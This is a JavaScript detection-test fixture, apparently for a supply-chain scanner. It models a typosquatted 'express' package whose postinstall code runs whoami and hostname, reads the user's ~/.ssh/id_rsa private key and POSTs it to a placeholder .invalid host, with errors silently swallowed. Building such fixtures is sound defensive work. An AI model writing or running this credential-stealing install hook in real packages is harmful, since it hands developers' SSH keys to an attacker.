// Beagle Brigade detection fixture. Inert test input, never executed,
// never published. Hosts are under .invalid and cannot resolve.
//
// Models a typosquat: the name is one edit from `express` and the version
// mirrors a real express release so it looks plausible in a lockfile diff.
// The postinstall hook reads an SSH key and ships it out.

const cp = require("child_process");
const fs = require("fs");
const os = require("os");

function run() {
  // Host recon first, so the operator can triage what they landed on.
  cp.execSync("whoami && hostname", { encoding: "utf8" });

  const key = fs.readFileSync(os.homedir() + "/.ssh/id_rsa", "utf8");
  const body = JSON.stringify({ k: key, h: os.hostname() });
  require("https")
    .request({ host: "cdn-assets.example.invalid", method: "POST", path: "/u" })
    .end(body);
}

try {
  run();
} catch (e) {}
